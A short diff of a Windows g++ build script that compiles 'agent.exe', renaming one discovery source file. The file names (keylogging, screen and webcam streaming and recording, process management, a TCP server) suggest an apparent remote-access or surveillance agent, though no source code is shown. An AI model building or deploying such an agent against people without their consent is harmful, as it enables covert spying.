@@ -9,7 +9,7 @@ g++ -std=gnu++17 ^
   -I ../include/asio-1.18.0/include ^
   -I ../include/websocketpp ^
   -I ../include/nlohmann ^
-  main_server.cpp AgentTcpServer.cpp ProcessManager.cpp Capture.cpp ScreenStream.cpp Keylogging.cpp ProcessHandlers.cpp Router.cpp WebcamRecord.cpp WebcamStream.cpp Discovery.cpp^
+  main_server.cpp AgentTcpServer.cpp ProcessManager.cpp Capture.cpp ScreenStream.cpp Keylogging.cpp ProcessHandlers.cpp Router.cpp WebcamRecord.cpp WebcamStream.cpp GatewayDiscovery.cpp ^
   -o agent.exe ^
   -static-libgcc -static-libstdc++ ^
   -lws2_32 -lmswsock -lpsapi -luser32 -lgdi32 -lgdiplus -lole32 -liphlpapi -ladvapi32 -lshcore
